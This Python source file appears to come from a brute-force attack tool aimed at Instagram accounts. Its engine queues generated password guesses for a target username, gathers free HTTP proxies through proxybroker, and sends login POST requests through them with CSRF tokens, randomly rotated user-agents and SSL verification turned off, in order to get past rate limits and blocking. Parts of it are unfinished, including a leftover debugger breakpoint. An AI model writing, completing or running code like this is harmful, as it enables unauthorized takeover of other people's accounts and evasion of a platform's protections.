from __future__ import absolute_import

import logging
import logging.config

import aiohttp
import asyncio
import random
import signal
from proxybroker import Broker
import json

from app import settings

from app.lib import exceptions
from app.lib.logging import AppLogger
from app.lib.models import InstagramResult
from app.lib.sessions import InstagramSession
from app.lib.users import User
from app.lib.utils import (auto_logger, get_token_from_cookies,
    get_token_from_response, get_cookies_from_response)


__all__ = ('EngineAsync', )


class Engine(object):

    __loggers__ = {
        '__base__': 'Instagram Engine',
        'attack': 'Attack',
        '_test_attack_async': 'Test Async Attack',
        '_test_attack_sync': 'Test Sync Attack',
        '_attack_sync': 'Synchronous Attack',
        '_attack_asnc': 'Asynchronous Attack',
        'consume_passwords': 'Logging In',
        'login': 'Logging In',
        'populate_passwords': 'Populating Passwords',
        'get_proxy_tokens': 'Fetching Tokens',
        'consume_attempts': 'Storing Attempted Password',
    }

    def __init__(self, username):
        self.user = User(username)

        logging.setLoggerClass(AppLogger)
        self.log = logging.getLogger(self.__loggers__['__base__'])

    async def exception_handler(self, coro, loop):
        try:
            await coro
        except Exception as e:
            self.log.info('from handler')
            self.log.error(str(e))
            loop.stop()

    async def shutdown(self, signal, loop):

        self.log.info(f'Received exit signal {signal.name}...')
        tasks = [t for t in asyncio.all_tasks() if t is not
            asyncio.current_task()]

        [task.cancel() for task in tasks]

        self.log.info('Canceling outstanding tasks...')
        await asyncio.gather(*tasks)

        loop.stop()
        self.log.success('Shutdown complete.')

    def _handle_api_exception(self, fut, exc, log):
        if isinstance(exc, exceptions.BadProxyException):
            log.info(exc.message, extra={
                'task': fut,
                'proxy': fut.proxy,
            })
        else:
            log.warning(exc.__class__.__name__, extra={
                'task': fut,
                'proxy': fut.proxy,
            })

    def _handle_app_exception(self, fut, exc, log):
        if isinstance(exc, exceptions.ApiException):
            self._handle_api_exception(fut, exc, log)
        else:
            raise exc

    def _handle_response_exception(self, fut, exc, log):
        if isinstance(exc, exceptions.InstagramAttackException):
            self._handle_app_exception(fut, exc, log)
        else:
            log.error(exc.__class__.__name__, extra={
                'task': fut,
                'proxy': fut.proxy,
            })


class EngineAsync(Engine):

    __client_exception__ = exceptions.InstagramClientApiException
    __server_exception__ = exceptions.InstagramServerApiException

    __status_code_exceptions__ = {
        429: exceptions.TooManyRequestsException,
        403: exceptions.ForbiddenException,
    }

    def __init__(self, username, mode='async', test=False, password=None):
        super(EngineAsync, self).__init__(username)
        self.lock = asyncio.Lock()

        self.mode = mode

        if test and not password:
            raise exceptions.EngineException("Must provide password to test async attack.")

        self.test = test
        self.password = password  # Used for Testing

        self.passwords = asyncio.Queue()
        self.attempts = asyncio.Queue()

        self.proxies = asyncio.Queue()

        self.broker = Broker(self.proxies, timeout=6, max_conn=200, max_tries=1)

    @auto_logger
    async def populate_passwords(self, loop, log):
        """
        Retrieves passwords generated passwords that have not been attempted
        from the User object and populates the password queue.
        """
        for password in self.user.get_new_attempts():
            self.passwords.put_nowait(password)

        if self.passwords.empty():
            raise exceptions.EngineException("No new passwords to try.")

        log.info(f"Populated {self.passwords.qsize()} Passwords")

    async def _handle_response(self, response):
        try:
            response.raise_for_status()
        except aiohttp.ClientResponseError as e:
            if response.status >= 400 and response.status < 500:
                exc = self.__status_code_exceptions__.get(
                    response.status,
                    self.__client_exception__,
                )
                raise exc(
                    response.reason,
                    status_code=response.status
                )
            else:
                import ipdb; ipdb.set_trace()
                raise e
                # raise self.__server_exception__(
                #     message=response.reason,
                #     status_code=response.status
                # )
        else:
            return response

    @auto_logger(show_running=False)
    async def login(self, loop, log):

        stop_event = asyncio.Event()

        def login_callback(fut):
            exc = fut.exception()
            if exc:
                self._handle_response_exception(fut, exc, log)
            else:
                if fut.result() is None:
                    log.error('Coroutine did not contain result.')
                else:
                    log.success('Got result')
                    log.info(fut.result())

        async def login(session, proxy):
            log.info("Fetching Token", extra={
                'proxy': proxy,
            })
            try:
                async with await session.get(
                    settings.INSTAGRAM_URL,
                    proxy=f"http://{proxy.host}:{proxy.port}/",
                    timeout=settings.DEFAULT_TOKEN_FETCH_TIME
                ) as response:
                    try:
                        response = await self._handle_response(response)
                    except Exception as e:
                        raise e
                    else:
                        log.info("Attempting Login", extra={
                            'proxy': proxy,
                        })
                        token = get_token_from_response(response)
                        # headers = {'Set-Cookie':
                        #     'csrftoken=%s; Domain=.instagram.com; expires=Thu, '
                        #     '02-Apr-2020 04:03:32 GMT; Max-Age=31449600; Path=/; Secure'
                        #     % token}
                        # headers = response.headers.copy()

                        # session._default_headers.update(response.headers)
                        headers = settings.HEADER.copy()
                        headers['user-agent'] = random.choice(settings.USER_AGENTS)
                        headers.update({
                            'x-csrftoken': token,
                            'X-CSRF-Token': token,
                            # 'Access-Control-Allow-Credentials': 'true',
                            # 'Proxy-Connection': 'Keep-Alive',
                        })
                        try:
                            async with session.post(
                                settings.INSTAGRAM_LOGIN_URL,
                                proxy=f"http://{proxy.host}:{proxy.port}/",
                                timeout=settings.DEFAULT_LOGIN_FETCH_TIME,
                                headers=headers,
                                # cookies=response.cookies,
                                data=json.dumps({
                                    'username': self.user.username,
                                    'password': self.password
                                }),
                            ) as response:
                                try:
                                    response = await self._handle_response(response)
                                except Exception as e:
                                    raise e
                                else:
                                    self.log.success('Got Response', extra={
                                        'proxy': proxy,
                                        'response': response
                                    })
                                    return await response.json()

                        except aiohttp.ClientError as exc:
                            self.log.error(exc.__class__.__name__, extra={
                                'proxy': proxy,
                            })

            except aiohttp.ClientError as exc:
                self.log.error(exc.__class__.__name__, extra={
                    'proxy': proxy,
                })

        tasks = []

        connector = aiohttp.TCPConnector(ssl=False)
        headers = settings.HEADER.copy()
        headers['user-agent'] = random.choice(settings.USER_AGENTS)

        index = 0
        async with aiohttp.ClientSession(headers=headers, connector=connector) as session:
            while not stop_event.is_set() and index <= 10:
                proxy = await self.proxies.get()
                if not proxy:
                    continue

                index += 1

                task = asyncio.ensure_future(login(session, proxy))
                task.name = f"Task {len(tasks) - 1}"
                task.proxy = proxy
                log.info("Got proxy", extra={
                    'proxy': proxy,
                    'task': task,
                })
                task.add_done_callback(login_callback)
                tasks.append(task)

            return await asyncio.gather(*tasks, return_exceptions=True)

    @auto_logger
    async def attack(self, loop, log):
        # May want to catch other signals too - these are not currently being
        # used, but could probably be expanded upon.
        signals = (signal.SIGHUP, signal.SIGTERM, signal.SIGINT)
        for s in signals:
            loop.add_signal_handler(
                s, lambda s=s: asyncio.create_task(self.shutdown(s, loop)))

        try:
            await self.exception_handler(self.populate_passwords(loop), loop)

            types = ['HTTP']
            tasks = [
                self.broker.find(types=types),
                self.login(loop)
            ]
            return await asyncio.gather(*tasks)

        finally:
            self.log.info('Cleaning up')
            tasks = [t for t in asyncio.all_tasks() if t is not
            asyncio.current_task()]

            [task.cancel() for task in tasks]

            self.log.info('Canceling outstanding tasks...')
            await asyncio.gather(*tasks)

            loop.stop()
            self.log.success('Shutdown complete.')

            loop.stop()
